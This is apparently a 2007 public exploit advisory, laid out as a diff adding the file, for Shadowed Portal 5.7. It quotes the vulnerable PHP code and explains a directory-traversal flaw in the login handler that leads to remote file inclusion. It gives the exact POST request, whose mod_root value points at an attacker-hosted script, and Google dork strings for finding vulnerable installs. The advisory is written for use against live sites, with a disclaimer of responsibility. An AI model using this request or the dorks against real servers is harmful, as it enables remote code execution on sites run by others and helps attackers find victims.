@@ -1,0 +1,122 @@
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                           
+------------------------------------------------------------------------------------------------
+This is a Public Exploit. 21/12/2007 (dd-mm-yyyy)
+------------------------------------------------------------------------------------------------
+§ Shadowed Portal 5.7 and maybe lower - Remote File Includes (Require) Vulnerabilities §
+Vendor:	  http://www.shad0wed.com
+Severity: Highest
+Author:	  The:Paradox
+
+Visit inj3ct-it.org
+
+Proud to be Italian.
+------------------------------------------------------------------------------------------------
+Related Codes:
+
+-- control.php; line 1:
+
+<?php
+
+require("config.php");
+
+require("globals.php");
+
+require("functions.php");
+
+require("variables.php");
+
+$return = setvar("return");
+
+if($act == "login") {
+
+$online = 0;
+
+$usr = $_POST['usr'];
+
+$pwd = $_POST['pwd'];
+
+if(file_exists($root."/users/".strtolower($usr).".php")) {
+
+require($root."/users/".strtolower($usr).".php");
+
+}
+
+-- globals.php; line 1:
+
+<?php
+
+define('CHECK',md5("null"));
+
+global $viv;
+
+global $mod;
+
+global $act;
+
+global $do;
+
+global $act;
+
+global $id;
+
+global $tp;
+
+global $w;
+
+global $method;
+
+global $board;
+
+global $user;
+
+global $pass;
+
+global $cat;
+
+global $linkback;
+
+global $HTTP_POST_VARS;
+
+global $_GET;
+
+global $_POST;
+
+global $_FILES;
+
+global $HTTP_REFERER;
+
+global $_SERVER;
+
+-- /modules/fs/mod.php; line 1:
+
+<?php
+
+if(!defined('CHECK')) { exit; }
+require($mod_root."/config.php");
+
+------------------------------------------------------------------------------------------------
+Bug Explanation: 
+
+This Portal presents a vulnerability in the "login system" that allows us to require a page ".php" in the directory "/users/" (whatever using directory transversal ("../") we can require any page).
+
+Additionally "Check" was defined by the required page globals.php, allowing us to bypass the "security-die" on the top of most php page (see /modules/fs/mod.php; line 1).
+If we require "/modules/fs/mod.php" with a $mod_root value, we can require an external page of the site.
+
+We can do Post Request to control.php?act=login with post values: usr=../modules/fs/mod&pwd=casualpass&mod_root=http://yoursite.org/yourscript? and get RFI.
+
+------------------------------------------------------------------------------------------------
+The require in control.php is extremely unsafe, it could be used with other pages to obtain other vulnerabilities.
+------------------------------------------------------------------------------------------------
+Google Dork-> Powered by Shadowed Portal
+Google Dork-> These script's code is Copyright 2003-2006 by Shadowed Works.
+------------------------------------------------------------------------------------------------
+Use this exploit at your own risk. You are responsible for your own deeds.
+------------------------------------------------------------------------------------------------
+Use your brain, do not lame. Enjoy. =)
+
+# milw0rm.com [2007-12-21]
